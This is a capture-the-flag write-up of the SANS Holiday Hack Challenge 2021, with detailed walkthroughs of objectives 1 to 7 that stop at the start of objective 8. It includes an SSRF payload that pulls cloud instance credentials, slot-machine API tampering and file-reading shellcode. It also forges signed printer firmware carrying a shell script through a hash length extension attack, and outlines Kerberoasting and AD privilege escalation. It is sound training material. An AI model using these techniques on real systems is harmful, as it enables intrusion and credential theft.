# SANS Holiday Hack Challenge 2021
<img src="images/hhc2021/image001.png" alt="drawing" width="1000px"/>
## Overview
This document is a writeup of SANS holiday challenge 2021. This document has answers of all the objectives (total 13), high-level approach as well as details on how those answers were derived.

| Objective completed      | The story |
| ----------- | ------------------------------------ |
| <img src="images/hhc2021/image002.png" alt="drawing" width="500px"/>     | Listen children to a story that was written in the cold<br> 'Bout a ringle and his castle hosting hackers, meek and bold<br> Then from somewhere came another, built his tower tall and proud<br> Surely, he, our Frosty villain hides intentions 'neath a shroud<br> So begins Jack's reckless mission: gather trolls to win a war<br> Build a con that's fresh and shiny, has his yet been done before?<br> Is his Fest more feint than folly? Some have noticed subtle clues<br> Running 'round and raiding repos, stealing Santa's Don'ts and Do's<br> Misdirected, scheming, grasping, Frost intends to seize the day<br> Funding research with a gift shop, can Frost build the better sleigh? <br>Lo, we find unlikely allies: trolls within Jack's own command<br> Doubting Frost and searching motive, questioning his dark demand<br> Is our Jack just lost and rotten - one more outlaw stomping toes?<br> Why then must we piece together cludgy, wacky radios?<br> With this object from the heavens, Frost must know his cover's blown<br> Hearkening from distant planet! We the heroes should have known<br> Go ahead and hack your neighbor, go ahead and phish a friend<br> Do it in the name of holidays, you can justify it at year's end<br> There won't be any retweets praising you, come disclosure day<br> But on the snowy evening after? Still Kris Kringle rides the sleigh |


## Answer to objectives and High-level approach

| Objectives      | Answers                          | High level approach                          |
| ----------- | ------------------------------------ |----------------------------------------------|
| <b>1.Kringlecon Orientation</b> | <b>answer</b> | Write “answer” in the top pane of the terminal presented by the elf Jingle Ringford.|
| <b>2.Where in the world is Carmel Santaigo?</b>      | <b>Solved in the game</b>                          | <b>OWASP Sensitive data exposure :</b><br> (In the flask cookie) Get the hints about the elf and their route info by decoding the flask cookie and use it in the game to follow and find the elf.                           |
| <b>3.Thaw Frost Tower's entrance</b>      | <b>Solved in the game</b>                          | <b>API Abuse :</b><br> Use the API http://nidus-setup:8080/api/cooler to increase the temperature of the thermostat to thaw the frozen entrance.|
| <b>4.Slot machine Investigation</b>      | <b>I'm going to have some bouncer trolls bounce you right out of this casino!| <b>API Abuse:</b><br>Manipulate the “numline” parameter sent to https://slots.jackfrosttower.com/ to increase the bet amount an exceed 1000 coins and reveal the answer.|
| <b>5.Strange USB Device</b>      | <b>ickymcgoop</b>                          | <b>USB Rubber Ducky :</b> <br> Use mallard.py to decode the encoded USB ducky script (/mnt/USBDEVICE/inject.bin). In the decoded value, find another reversed base64 value, reverse it and decode to find the user for whom an authorized_key file is getting created with the public cert.                          |
| <b>6.Shellcode Primer</b>      | <b>cyber security knowledge</b> | <b>Shell code :</b> <br> On Step 11) '/var/northpolesecrets.txt' <br> 1. Call sys_open to open the file <br> 2. Call sys_read to read the file using buffer (mov rsi, rsp) <br> 3. Call sys_write to write contents from rsp to stdout (Keep the count high e.g., 1000 so we can account for all contents in the file)|
| <b>7.Printer Exploitation</b>      | <b>Troll_Pay_Chart.xlsx</b> | <b>Hash Length extender attack :</b> <br> 1.Download the firmware, decode the firmware field from base64 to extract the zip file.<br> 2.Craft the payload to copy the name of last printed xlsx file to a new file and copy the file to /incoming folder.<br> 3.Use hash extender to append our payload zip to original zip file using hash and base64 encode the output. Create the JSON firmware from it.<br> 4. Upload the new JSON firmware to the portal.<br> 5. Download the file from /incoming folder which will have the name of the last printed .xlsx file.<br>|
| <b>8.Kerberoasting on an Open Fire</b>      | <b>Kindness</b>                          | <b>Kerberoasting and WriteDACL abuse :</b> <br>1.Get the two shared folders in the network using our user: elfu_svc_shr and research_dep<br>2.Kerberoasting attack to get TGS (Ticket granting service) hash for elfu_svc.<br>3.Use Hashcat to crack TGS hash for elfu_svc user.<br>4.Get hard coded creds for remote_elf embedded in PowerShell script which is stored in \elfu_svc_shr share.<br>5.PrivEsc – Use WriteDACL to add our low priv. user to AD group “Research Department”.<br>6.Access the secret document “SantaSecretToAWonderfulHolidaySeason.pdf” in the \reserach_dep to find the answer.<br>|
| <b>9.Splunk</b>      | <b>whiz</b>                          | Splunk queries on Sysmon and Github audit data <br>(Described in the relevant section below)|
| <b>10.Now Hiring</b> | <b>CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX</b> | <b>Server-Side Request Forgery (SSRF) on EC2 hosted website:</b> <br>1.Website has URL as an input in the “URL to your NLBI report” field.<br> 2.Send http://169.254.169.254/latest/meta-data/iam/security-credentials/ in the URL and see the name of IAM role (“jf-deploy-role”) attached to the EC2 instance returned in the response of the GET request of an image.<br> 3.Send http://169.254.169.254/latest/meta-data/iam/security-credentials/jf-deploy-role in the URL input and get the secret access key returned in the response of the GET request of an image.<br>|
| <b>11.Customer Complaint Analysis</b> | <b>Flud Hagg Yaqh</b> | <b>Packet Analysis using Wireshark for RFC 3514 compliance: </b><br>1.	From .pcap file, find the room number for the guest who is RFC 3514 non-compliant using ip.flags.rb == 0</br>2.From the .pcap file, find the trolls who are compliant (ip.flags.rb == 1) and complaining about the guest in the room number found in 1)
| <b>12. Frost Tower Website Checkup</b> | <b>Clerk</b> | <b>OWASP broken auth and SQL Injection attacks:</b> <br>1.Examine the source code<br>2.Broken auth: Exploit the /postcontact endpoint to log in and get access to the dashboard.<br>3.SQL Injection: Exploit the /detail endpoint to get additional table name (“todo”) and its column names.<br>4.Get data from table “todo” table having the job position for Santa.<br>|
| <b>13. FPGA Programming</b>      |        <b>TBD</b>                   |            TBD               |


<style>

</style>

## 1. Kringlecon Orientation
<!-- 
<table style="table-layout:fixed;overflow-wrap: break-word;width=100%" border="2">
  <tr>
    <td><img src="images/hhc2021/difficulty_1.png" alt="drawing" width="100px"/></td>
    <td><img src="images/hhc2021/image009.png" alt="drawing" width="30px"/>Entry</td>
    <td><img src="images/hhc2021/image010.png" alt="drawing" width="50px"/>Tangle Coalboxsssssssssssssssssssssssssssssssssssssssssssss</td>
  </tr>
 
</table>

| Header1 | header2 | header3 | header4  |
| ------- | ------- |---------|----------|
| Bar     | bar     | bar     | bar      |

| <img src="images/hhc2021/difficulty_1.png" alt="drawing" width="100px"/>      | <img src="images/hhc2021/image009.png" alt="drawing" width="30px"/>Entry                          | <img src="images/hhc2021/image010.png" alt="drawing" width="50px"/>Tangle Coalbox|
| ----------- | ------------------------------------ |----------------------------------------------|
-->
Upon login on [https://2021.kringlecon.com](https://2021.kringlecon.com), we see Jingle Ringford guarding the entry asking below  <br>
>First things first, here's your badge! It's that wrapped present in the middle of your avatar.<br>
>Click on the badge on your avatar 🎁. <br>
That’s where you will see your Objectives, Hints, and gathered Items for the Holiday Hack Challenge.<br>
>We’ve also got handy links to the KringleCon talks and more there for you!<br>
>Next, click on that USB wifi adapter - just in case you need it later.

<img src="images/hhc2021/image003.png" alt="drawing" width="500px"/>
<table>
        <tr>
        <td><img src="images/hhc2021/image004.png" alt="drawing" width="200px"/></td>
        <td><img src="images/hhc2021/image005.png" alt="drawing" width="200px"/></td>
        </tr>
</table>


We pick up the Wi-Fi adapter.<br>
We click on the terminal to access it and then type “answer” in the upper pane of the terminal and the gate is opened.<br>

<table>
        <tr>
        <td><img src="images/hhc2021/image006.png" alt="drawing" width="500px"/></td>
        <td><img src="images/hhc2021/image007.png" alt="drawing" width="500px"/></td>
        </tr>
</table>

## 2. Where in the world is Carmel Santaigo

<table>
        <tr>
        <td><img src="images/hhc2021/image011.png" alt="drawing" width="200px"/></td>
        <td>
            <b>Hints from Tangle Coalbox</b><br>
            Turns out some elves have gone on some misdirected journeys around the globe. <br>
            It seems that someone is messing with their travel plans.<br>
            We could sure use your open-source intelligence (OSINT) skills to find them.<br>
            Why dontcha' log into this vintage Cranberry Pi terminal and see if you have what it takes to track them around the globe.<br>
            If you're having any trouble with it, <b>you might ask Piney Sappington right over there for tips</b>.<br>
        </td>
        </tr>
</table>
Tangle Coalbox indicates another elf named “Piney Sappington” may have some hints on how to solve this objective. <br>
So, we head over to that elf now who is also present in the courtyard.

<table>
        <tr>
        <td><img src="images/hhc2021/image013.png" alt="drawing" width="200px"/></td>
        <td>
            <b>Hints from Piney Sappington</b><br>
            You see, I've been looking at these documents, and I know someone has tampered with one file. <br>
            Do you think you could log into this Cranberry Pi and take a look?<br>
            It has exiftool installed on it, if that helps you at all.<br>
            I just... Well, I have a feeling that someone at that other conference might have fiddled with things.<br>
            And, if you help me figure this tampering issue out, I’ll give you some hints about OSINT, especially associated with geographic locations!<br>
        </td>
        </tr>
</table>

In the terminal we are presented with the below problem:<br>
>HELP! That wily jack Frost Modified one of our naughty/nice records, and right before Christmas! 
>Can you help us which one? We’ve installed exiftool for your convenience!

<img src="images/hhc2021/image014.png" alt="drawing" width="500px"/>

We will get the Last Modified By attribute value for all the docx files and then grep the output it with “Jack”. <br>
That should give us all the files which were last modified by Jack Frost. <br> 
We have -C 5 in the grep so we can get the lines around the matches for the context.

Command entry and output : <br>
<img src="images/hhc2021/image015.png" alt="drawing" width="600px"/><br>
Answer verification : <br>
<img src="images/hhc2021/image016.png" alt="drawing" width="600px"/><br>
Achivement Unlocked :<br>
<img src="images/hhc2021/image017.png" alt="drawing" width="500px"/><br>
Hint Unlocked :<br>
<img src="images/hhc2021/image018.png" alt="drawing" width="500px"/>


The “flask cookies” hint is actually a Github Gist from Mr. Chris Elgee. <br>
[https://gist.github.com/chriselgee/b9f1861dd9b99a8c1ed30066b25ff80b](https://gist.github.com/chriselgee/b9f1861dd9b99a8c1ed30066b25ff80b) <br>
That above gist shows how one can decode the value in a cookie generated by Flask applications. <br>

Going back to objective #2 we start the game.<br>
<img src="images/hhc2021/caramel_santaigo_start_game.png" alt="drawing" width="500px"/><br>
In the browser we open developer tools. <br>
Under developer tools > Application tab there is a cookie named "Cookiepella" for the domain used for the challenge (caramel.kringlecastle.com).<br>

<img src="images/hhc2021/image019.png" alt="drawing" width="1000px"/> <br>

We follow the instructions to decode the value in the flask cookie to JSON.<br>

```python
cookie = "<value of the cookiepella cookie>"
import zlib; import itsdangerous
zlib.decompress(itsdangerous.base64_decode(cookie))
```
<img src="images/hhc2021/image020.png" alt="drawing" width="1000px"/> <br>

We format the output JSON for better understanding.<br>
The JSON has details about the elf to identify them. <br>
The JSON has also has the route the elf took. We can take the same route to catch the elf. <br>
<img src="images/hhc2021/image021.png" alt="drawing" width="800px"/> <br>

On the visit interlink page, we supply data we have in the decoded flask cookie and click on "Filter Elves". <br>
<img src="images/hhc2021/image022.png" alt="drawing" width="1000px"/> <br>

The elves have been filtered out based on the data and possibly Its Morcel Nougat and their location was "Santa's Castel"<br>
Both of these datapoints are also in the decoded cookie value.<br>

Note the route taken by the elf in the decoded cookie value:<br>
<b>Stuttgart, Germany > Tokyo, Japan > London, England > PlaceHolder</b><br>
We click on "Depart by sleigh" to follow the same route to catch up with the elf in London, England.<br>

<table>
        <tr>
            <td>In London, England, we notice there is no option to "Depart by Sleigh"<br>
                which indicates we are close to the elf. We click on Investigate.
            </td>
            <td>
            We are presented with 3 investigate options.<br>
            </td>
        <tr>
        <td>
        <img src="images/hhc2021/image023.png" alt="drawing" width="500px"/>
        </td>
        <td>
            <img src="images/hhc2021/image024.png" alt="drawing" width="500px"/><br>
        </td>
        </tr>
</table>


When we click on "Investigate 1", It says we have caught up to the elf.<br>
We are given the option to guess the elf.<br>
We choose "Morcel Nouget" since Its also in the name of the elf in the decoded cookie.
<img src="images/hhc2021/image025.png" alt="drawing" width="1000px"/> <br>

Upon selecting the elf and clicking on the “Guess Elf” <br>
The message "You've won" appears which means we have completed the challenge.<br>
<img src="images/hhc2021/image026.png" alt="drawing" width="500px"/><br>

## 3. Thaw Frost Tower Entrance

<table border=1px>
<tr>
    <td colspan=3>
    <b>Challenge : </b> <br>
    Turn up the heat to defrost the entrance to Frost Tower. <br>Click on the Items tab in your badge to find a link to the Wifi Dongle's CLI interface. Talk to Greasy Gopherguts outside the tower for tips
    </td>
</tr>
<tr>
    <td>
    <b>Difficulty Level : </b> <br>
    <img src="images/hhc2021/difficulty_2.png" alt="drawing" width="100px"/><br>
    </td>
    <td>
     <b>Location : </b> <br>
    Frost Tower Entrance
    </td>
    <td>
    <b>Elf/Troll : </b> <br>
   <img src="images/hhc2021/image027.png" alt="drawing" width="30px"/> Grimy McTrollkins <br>
    </td>
</tr>
</table>
<table>
<tr>
    <td>
    <img src="images/hhc2021/image028.png" alt="drawing" width="100px"/>
    </td>
    <td>
    <b> Hints from Grimy McTrollkins </b> <br>
    Yo, I'm Grimy McTrollkins. <br>
    I'm a troll and I work for the big guy over there: Jack Frost.<br>
    I’d rather not be bothered talking with you, but I’m kind of in a bind and need your help.<br>
    Jack Frost is so obsessed with icy cold that he accidentally froze shut the door to Frost Tower!<br>
    I wonder if you can help me get back in.<br>
    I think we can melt the door open if we can just get access to the thermostat inside the building.<br>
    That thermostat uses Wi-Fi. And I’ll bet you picked up a Wi-Fi adapter for your badge when you got to the North Pole.<br>
    Click on your badge and go to the Items tab. There, you should see your Wi-Fi Dongle and a button to “Open Wi-Fi CLI.” That’ll give you<br> command-line interface access to your badge’s wireless capabilities.<br>
    </td>
<tr>
</table>

Click on the badge and go to the Items tab. There, we see the Wi-Fi Dongle and a button to “Open Wi-Fi CLI.” <br>
That gives us command-line interface access to wireless capabilities.<br>

<table>
<tr>
    <td>
    <img src="images/hhc2021/image029.png" alt="drawing" width="400px"/>
    </td>
    <td>
    <img src="images/hhc2021/image030.png" alt="drawing" width="600px"/>
    </td>
<tr>
</table>


Scan for any available the ESSIDs  <br>
```bash
iwlist wlan0 scanning 
```

<img src="images/hhc2021/image031.png" alt="drawing" width="600px"/>

We find an ESSID named “FROST-Nidus-Setup”. <br>
Now we connect to “FROST-Nidus-Setup” ESSID.
```bash
iwconfig wlan0 essid FROST-Nidus-Setup
```
<img src="images/hhc2021/image032.png" alt="drawing" width="1000px"/>

Connection succecssful to the ESSID. <br>
Issue a curl command to http://nidus-setup:8080. <br>

```bash
curl http://nidus-setup:8080
```
<img src="images/hhc2021/image033.png" alt="drawing" width="1000px"/>

Looks like few APIs are hosted there. <br>
Access the API docs <br>
Note the /api/cooler does not need registration <br>
```bash
curl http://nidus-setup:8080/apidoc
```
<img src="images/hhc2021/image034.png" alt="drawing" width="800px"/>

Following the documentation, we make use of /cooler endpoint passing a temperature which may melt ice e.g., 110 degrees <br>

```bash
curl -XPOST -H 'Content-Type: application/json' \
  --data-binary '{"temperature": 110}' \
  http://nidus-setup:8080/api/cooler
```
<img src="images/hhc2021/image036.png" alt="drawing" width="800px"/>

The jack frost tower entrance is now open and the objective is now completed. <br>

<table>
<tr>
    <td>
    <img src="images/hhc2021/image037.png" alt="drawing" width="800px"/>
    </td>
    
    
    </td>
<tr>
</table>
<img src="images/hhc2021/image038.png" alt="drawing" width="500px"/>

## 4. Slot Machine Investigation
<table border=1px>
<tr>
    <td colspan=3>
    <b>Challenge : </b> <br>
    Test the security of Jack Frost's slot machines. <br> 
    What does the Jack Frost Tower casino security team threaten to do when your coin total exceeds 1000? 
    Submit the string in the server data.response element. <br>
    Talk to Noel Boetie outside Santa's Castle for help.
    </td>
</tr>
<tr>
    <td>
    <b>Difficulty Level : </b> <br>
    <img src="images/hhc2021/difficulty_2.png" alt="drawing" width="100px"/><br>
    </td>
    <td>
     <b>Location : </b> <br>
    Frost Tower Lobby
    </td>
    <td>
    <b>Elf/Troll : </b> <br>
   <img src="images/hhc2021/image027.png" alt="drawing" width="30px"/> Hubris Selfington <br>
    </td>
</tr>
</table>

<table>
<tr>
    <td>
    <img src="images/hhc2021/image039.png" alt="drawing" width="100px"/>
    </td>
    <td>
    <b> Hints from Hubris Selfington </b> <br>
    The big boss told me he’s worried about vulnerabilities in his slot machines, especially this one.<br>
    Statistically speaking, it seems to be paying out way too much.<br>
    He asked me to see if there are any security flaws in it.<br>
    The boss has HUGE plans and we’ve gotta make sure we are running a tight ship here at Frost Tower.<br>
    <b>Hint:</b><br>
    The objective states “Submit the string in the server data. response element”
    </td>
<tr>
</table>

Clicking on the slot machine behind the troll opens <a href="https://slots.jackfrosttower.com" target=_blank>https://slots.jackfrosttower.com</a> where we can click “Play game” to open the game.
<table>
<tr>
    <td>
    <img src="images/hhc2021/image040.png" alt="drawing" width="400px"/>
    </td>
    <td>
    <img src="images/hhc2021/image041.png" alt="drawing" width="600px"/>
    </td>
<tr>
</table>

We open Burp Suite and capture traffic for only slots.jackfrosttower.com. <br>
Click "Spin" in the bottom right corner. <br>
<img src="images/hhc2021/image042.png" alt="drawing" width="400px"/>

Burp intercepts the requests and shows a POST request to the /api/v1/<guid>/spin with three parameters: <br> 
<ol>
    <li>betamount</li>
    <li>numline</li>
    <li>cpl</li>
</ol>
<img src="images/hhc2021/image043.png" alt="drawing" width="600px"/>

We investigate with repeater, sending 1001 to the betamount parameter and It does not work. <br>
<img src="images/hhc2021/image044_1.png" alt="drawing" width="1000px"/>

Keeping the betamount parameter as 1001 (because we need to bet with >1000 coins), we manipulate the other two parameters, numline and cpl, send them to the API to see if we are successful.


<table>
<tr>
    <th>Manipulating parameter values</th>
    <th>Request</th>
    <th>Response</th>
</tr>
<tr>
    <td>
    Decrease cpl to 0.0
    </td>
    <td>
    <img src="images/hhc2021/image045.png" alt="drawing" width="400px"/>
    </td>
    <td>
    <img src="images/hhc2021/image046.png" alt="drawing" width="400px"/>
    </td>
<tr>
<tr>
    <td>
    Increase cpl to 0.2
    </td>
    <td>
    <img src="images/hhc2021/image047.png" alt="drawing" width="400px"/>
    </td>
    <td>
    <img src="images/hhc2021/image048.png" alt="drawing" width="400px"/>
    </td>
<tr>
<tr>
    <td>
    Decrease numline to 10
    </td>
    <td>
    <img src="images/hhc2021/image049.png" alt="drawing" width="400px"/>
    </td>
    <td>
    <img src="images/hhc2021/image048.png" alt="drawing" width="400px"/>
    </td>
<tr>
<tr>
    <td>
    Increase numline to 30
    </td>
    <td>
    <img src="images/hhc2021/image050.png" alt="drawing" width="400px"/>
    </td>
    <td>
    <img src="images/hhc2021/image048.png" alt="drawing" width="400px"/>
    </td>
<tr>
<tr>
    <td>
    Make numline a negative number
    </td>
    <td>
    <img src="images/hhc2021/image051.png" alt="drawing" width="400px"/>
    </td>
    <td>
    <img src="images/hhc2021/image052.png" alt="drawing" width="1000px"/>
    </td>
<tr>
</table>

Full request and response showing sending a negative value in the numline parameter would show a message in a new field named "response". <br>
<img src="images/hhc2021/image053.png" alt="drawing" width="2000px"/>

The successful response shown below : <br>
<img src="images/hhc2021/image054.png" alt="drawing" width="1000px"/>

data.response :  
<b>I'm going to have some bouncer trolls bounce you right out of this casino!</b> <br>

We submit the highlighted as the answer for the Slot Machine Investigation objective and its accepted!<br>
<img src="images/hhc2021/image055.png" alt="drawing" width="400px"/>

## 5. Strange USB device

<table border=1px>
<tr>
    <td colspan=3>
    <b>Challenge : </b> <br>
    Assist the elves in reverse engineering the strange USB device. Visit Santa's Talks Floor and hit up Jewel Loggins for advice.
    </td>
</tr>
<tr>
    <td>
    <b>Difficulty Level : </b> <br>
    <img src="images/hhc2021/difficulty_2.png" alt="drawing" width="100px"/><br>
    </td>
    <td>
     <b>Location : </b> <br>
    Santa’s talk floor 
    </td>
    <td>
    <b>Elf/Troll : </b> <br>
   <img src="images/hhc2021/image010.png" alt="drawing" width="30px"/> Morcel Nougat <br>
    </td>
</tr>
</table>

<table>
<tr>
    <td>
    <img src="images/hhc2021/image056.png" alt="drawing" width="300px"/>
    </td>
    <td>
    <b> Hints from Morcel Nougat : </b> <br>
        Do you know anything about USB Rubber Duckies?
        I've been playing around with them a bit myself.<br>
        Please see what you can do to help solve the Rubber Ducky Objective!<br>

        <b>Reference</b><br>
        Talk by Kevin Tyers  <br>
        <a href="https://www.youtube.com/watch?v=tkAYncGF-zw" target="_blank">HIDden Duckey, Deconstructed Payload</a>
    </td>
<tr>
</table>

We open the terminal and presented with a question <br>
Question: What is the troll username involved with this attack. <br>
<img src="images/hhc2021/image057.png" alt="drawing" width="600px"/>

We see there is an inject.bin under /mnt/USBDEVICE <br>
<img src="images/hhc2021/image058.png" alt="drawing" width="600px"/>

We do the file listing and we see a python file named “mallard.py”. <br>
If we look at the contents of the file, we see the python script takes an "inject.bin" file as an input
<img src="images/hhc2021/image059.png" alt="drawing" width="600px"/>
<img src="images/hhc2021/image060.png" alt="drawing" width="800px"/>

We run the mallard.py with the inject.bin as input.
```python
python ./mallard.py --file /mnt/USBDEVICE/inject.bin
```
The rubber ducky binary inject.bin is decoded.
We see a few interesting things being done in the original file. Numbered in the screenshot below :

<ol>
<li>There is a hardcoded base 64 string which looks like reversed ("==" in the front)</li>
<li>The "rev" used to reverse the already reversed base64 string making it a proper base64 string.</li>
<li>"base64" command with -d switch to decode the base64 string </li>
</ol>

<img src="images/hhc2021/image061.png" alt="drawing" width="1000px"/>

So we take the above line from the source code  and execute in the terminal <br>
The base64 is reversed and decoded to reveal the user’s name.

<img src="images/hhc2021/image062.png" alt="drawing" width="1000px"/>

In the above an authorized_key file is getting created with the public cert for the user <b>ickymcgoop</b>.
 The answer is <b>ickymcgoop</b> <br>

We submit that username as the answer. 
<img src="images/hhc2021/image063.png" alt="drawing" width="1000px"/>

The answer gets accepted and we complete this objective.
<img src="images/hhc2021/image064.png" alt="drawing" width="1000px"/>
<img src="images/hhc2021/image065.png" alt="drawing" width="400px"/>

## 6. Shell Code Primer

<table border=1px>
<tr>
    <td colspan=3>
    <b>Challenge : </b> <br>
    Complete the Shellcode Primer in Jack's office.<br>
    According to the last challenge, what is the secret to KringleCon success? "All of our speakers and organizers, providing the gift of ____, free to the community." <br> 
    Talk to Chimney Scissorsticks in the NetWars area for hints.
    </td>
</tr>
<tr>
    <td>
    <b>Difficulty Level : </b> <br>
    <img src="images/hhc2021/difficulty_3.png" alt="drawing" width="100px"/><br>
    </td>
    <td>
     <b>Location : </b> <br>
        Jack’s Office                                                                                     
    </td>
    <td>
    <b>Elf/Troll : </b> <br>
   <img src="images/hhc2021/image027.png" alt="drawing" width="30px"/> Ruby Cyster <br>
    </td>
</tr>
</table>

<table>
<tr>
    <td>
    <img src="images/hhc2021/image056.png" alt="drawing" width="300px"/>
    </td>
    <td>
    <b> Hints from Ruby Cyster : </b> <br>
    I'm looking at this system, and it has me a little bit worried.<br>
    If I didn't know better, I'd say someone here is learning how to hack North Pole systems.<br>
    Who's got that kind of nerve!<br>
    Anyway, I hear some elf on the other roof knows a bit about this type of thing.<br>

    <b> Note:</b> <br>
    The website is <a href="https://tracer.kringlecastle.com/" target="_blank">https://tracer.kringlecastle.com/</a> <br>
    This objective has 11 steps. 1-10 are easy to follow tutorials which will be used for step 11. 
    Step 11 has no hints and solving that would answer this objective. <br>
    Therefore, in the interest of documentation for other objectives in the report we are doing to provide details on step 11 only.
    </td>
<tr>
</table>

<b>Shell Code for step 11. Reading a file (/var/northpolesecrets.txt)</b>
```shell
;sys_open
call doit
db '/var/northpolesecrets.txt',0
 
doit:
mov rax, 2
pop rdi
mov rsi, 0
mov rdx, 0
syscall
  
; TODO: Call sys_read on the file handle and read it into rsp
;sys_read
;push rdi ; Temporarily store the filename pointer
;push rax ; Temporarily store the handle
;pop rdi ; Move the file handle into rdi
;pop rsi ; 
mov rdi, rax ; sys_open returns the fd into rax, so move it to rdi before set rax to sys_read.
mov rax, 0 ; Syscall 0 = sys_read
mov rdx, 1000 ; rdx is the count
mov rsi,rsp; from the hint
syscall
 
; TODO: Call sys_write to write the contents from rsp to stdout (1)
mov rax, 1 ; Syscall 1 = sys_write
mov rdi, 1 ; File handle to write to = stdout = 1  ; (rsi is already the buffer)
mov rdx, 1000; rdx is the count again 
mov rsi, rsp; from the hint
syscall ; Perform the sys_write syscall, writing the data to stdout
 
; sys_exit
mov rax, 3Ch ; for sys_exit
mov rdi, 0 ; exit code
syscall
```
<b>The deugger</b> </br>
<img src="images/hhc2021/image067.png" alt="drawing" width="1000px"/>

The full content of the file (/var/northpolesecrets.txt) is below. <br>
<b>Secret to KringleCon success: all of our speakers and organizers, providing the gift of cyber security knowledge, free to the community</b> <br>

The missing part in the question is <b>"cyber security knowledge"</b>. <br>
We submit it as the answer to this objective and Its now Its completed.

<img src="images/hhc2021/image068.png" alt="drawing" width="400px"/>

## 7. Printer Exploitation
<table border=1px>
<tr>
    <td colspan=3>
    <b>Challenge : </b> <br>
    Investigate the stolen Kringle Castle printer. Get shell access to read the contents of /var/spool/printer.log. What is the name of the last file printed (with a .xlsx extension)? <br> 
    Find Ruby Cyster in Jack's office for help with this objective. 
    </td>
</tr>
<tr>
    <td>
    <b>Difficulty Level : </b> <br>
    <img src="images/hhc2021/difficulty_4.png" alt="drawing" width="100px"/><br>
    </td>
    <td>
     <b>Location : </b> <br>
        Jack’s Office                                                                                     
    </td>
    <td>
    <b>Elf/Troll : </b> <br>
   <img src="images/hhc2021/image027.png" alt="drawing" width="30px"/> Ruby Cyster <br>
    </td>
</tr>
</table>


<table>
<tr>
    <td>
    <img src="images/hhc2021/image069.png" alt="drawing" width="200px"/>
    </td>
    <td>
    <b> Hints from Ruby Cyster (Because we solved the objective “Shellcode primer”) : </b> <br>
    <ol>
    <li>You should definitely look at the firmware
	<li>Pick the firmware apart and see what's there.
	<li>If you append multiple files of that type, the last one is processed.
	<li>Look at hash Extension Attacks.
    <a href="https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks" target="_blank"> Link 1</a> |
    <a href="https://github.com/iagox86/hash_extender"  target="_blank">Link 2 </a>
    <li>Files placed in /app/lib/public/incoming will be accessible under
    <a href="https://printer.kringlecastle.com/incoming/"  target="_blank">https://printer.kringlecastle.com/incoming/</a> </li>
    </ol>

    <b> Website :</b> <br>
    <a href="https://printer.kringlecastle.com/"  target="_blank">https://printer.kringlecastle.com/</a>
    </td>
<tr>
</table>

### Examination of firmware
Following the grinch's first hint, we go to https://printer.kringlecon.com > Firmware update > Download current firmware and download it. It’s basically a JSON file. <br>
The element <b>firmware</b> has the firmware data in it. 
<img src="images/hhc2021/image070.png" alt="drawing" width="800px"/>

Decode it and save the output to a file named firmware_hhc2021

<img src="images/hhc2021/image071.png" alt="drawing" width="800px"/>

We determine the file type and we see It’s a zip file so we rename the file to firmware_hhc2021.zip

<img src="images/hhc2021/image072.png" alt="drawing" width="800px"/>

### Building our own payload
We build a bin file with above and name it firmware_ashish.bin. <br>
This will copy the last entry of the xlsx file from /var/spool/printer.log and save in a new file named /app/lib/public/incoming/ashish.<br>

```bash
#!/bin/bash
grep xlsx /var/spool/printer.log | tail -n1 > /app/lib/public/incoming/ashish
```

Provide execute permission on the firmware_ashish.bin
<img src="images/hhc2021/image073.png" alt="drawing" width="800px"/>

Zip firmware_ashish.bin to firmware_ashish.zip.
<img src="images/hhc2021/image074.png" alt="drawing" width="800px"/>

### Extend the original firmware payload with our custom payload
We make use of <a href="https://github.com/iagox86/hash_extender" target="_blank">hash extender</a>. <br>
Download the source and build it.
```bash
git clone https://github.com/iagox86/hash_extender
cd hash_extender
make
```

<img src="images/hhc2021/image075.png" alt="drawing" width="800px"/>


Now we havd the original firmware firmware_hhc2021.zip and custom firmware_ashish.zip.
<img src="images/hhc2021/image076.png" alt="drawing" width="600px"/>

Now will need to append our payload firmware_ashish.zip to the original firmware_hhc2021.zip. <br>

Following the readme on <a href="https://github.com/iagox86/hash_extender" target="_blank">https://github.com/iagox86/hash_extender</a>. <br> Below would be our inputs to the hash_extender.

<table>
<tr>
    <th>Hash Extender Switch</th>
    <th>Spplied values and explaination</th>
</tr>
<tr>
    <td>--file</td>
    <td><b>firmware_hhc2021.zip</b> <br>
    The original payload from printer portal in zipped format
    </td>
</tr>
<tr>
    <td>--append</td>
    <td>
    <b>$(cat firmware.zip | xxd -p -c 99999)</b><br>
    HEX representation of our payload in the zip file (firmware_ashish.zip) 
    </td>
</tr>
<tr>
    <td>--append-format</td>
    <td>
    <b>hex</b> <br>
    (because we are appending a HEX value)
    </td>
</tr>
<tr>
    <td>--secret</td>
    <td>
    <b>16</b> <br>
    (Present in the original JSON file we downloaded from the printer portal)
    </td>
</tr>
<tr>
    <td>--format</td>
    <td>
    <b>sha256</b> <br>
    (Present in the original JSON file we downloaded from the printer portal)
    </td>
</tr>
<tr>
    <td>--signature</td>
    <td>
    <b>2bab052bf894ea1a255886fde202f451476faba7b941439df629fdeb1ff0dc97</b> <br>
    (Present in the original JSON file we downloaded from the printer portal)
    </td>
</tr>
<tr>
    <td>--out-data-format</td>
    <td>
    <b>hex</b> <br>
    </td>
</tr>
</table>

We fire up hash_extender with the above switch values : <br>
```bash
./hash_extender --file=firmware_hhc2021.zip --secret=16 
--signature ="2bab052bf894ea1a255886fde202f451476faba7b941439df629fdeb1ff0dc97" 
--append=$(cat firmware_ashish.zip | xxd -p -c 99999) --format sha256 --out-data-format=hex
```

This produced a new string and new signature. 

<img src="images/hhc2021/image077.png" alt="drawing" width="1000px"/>

The new string produced is in hex format (as we specified in the --out-data-format). <br>
So, we need to use Cyberchef to convert the hex to base64.

<img src="images/hhc2021/image078.png" alt="drawing" width="1000px"/>

This output from CyberChef has our appended paylod to get the file name. <br>
Now we update the original firmware_export.json with the new payload and the new signature we got above.
<img src="images/hhc2021/image079.png" alt="drawing" width="1200px"/>

Now we upload the new firmware-export.json back to the portal. <br>
We browse the file https://printer.kringlecastle.com/incoming/ashish<br>
File "ashish" is downloaded and we can see the xlsx file name in it. <br>

<img src="images/hhc2021/image080.png" alt="drawing" width="1200px"/>

We submit “Troll_Pay_Chart.xlsx” as the answer to this objective and it is accepted.

<img src="images/hhc2021/image081.png" alt="drawing" width="400px"/>


## 8. Kerberoasting on an Open Fire

<table border=1px>
<tr>
    <td colspan=3>
    <b>Challenge : </b> <br>
    Obtain the secret sleigh research document from a host on the Elf University domain.<br>
